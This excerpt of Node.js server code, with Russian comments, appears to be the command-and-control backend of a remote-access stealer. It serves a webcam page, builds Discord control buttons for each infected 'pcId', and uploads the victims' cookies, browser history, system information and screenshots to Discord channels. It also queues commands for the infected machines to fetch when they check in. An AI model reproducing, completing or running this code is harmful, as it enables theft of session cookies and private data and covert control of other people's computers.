...
app.use(express.static(path.join(__dirname, "public"))); // cams.html и стили
...
function createControlButtons(pcId){ const safePcId=encodeURIComponent(pcId); return [new ActionRowBuilder().addComponents(
...
const files=[]; const descriptions=[];
if(cookies){files.push({attachment:Buffer.from(JSON.stringify({cookies},null,2)) ,name:`${channelName}-cookies.json`}); descriptions.push("🍪 **Cookies** — сохранены");}
if(history){files.push({attachment:Buffer.from(JSON.stringify({history},null,2)),name:`${channelName}-history.json`}); descriptions.push("📜 **История браузера** — сохранена");}
if(systemInfo){files.push({attachment:Buffer.from(JSON.stringify({systemInfo},null,2)),name:`${channelName}-system.json`}); descriptions.push("💻 **Системная информация** — сохранена");}
if(screenshot){files.push({attachment:Buffer.from(screenshot,"base64"),name:`${channelName}-screenshot.jpeg`}); descriptions.push("🖼️ **Скриншот** — сохранён");}
...
onlinePCs[pcId]=Date.now();
const commands=pendingCommands[pcId]||[]; pendingCommands[pcId]=[];
res.json({commands});
});
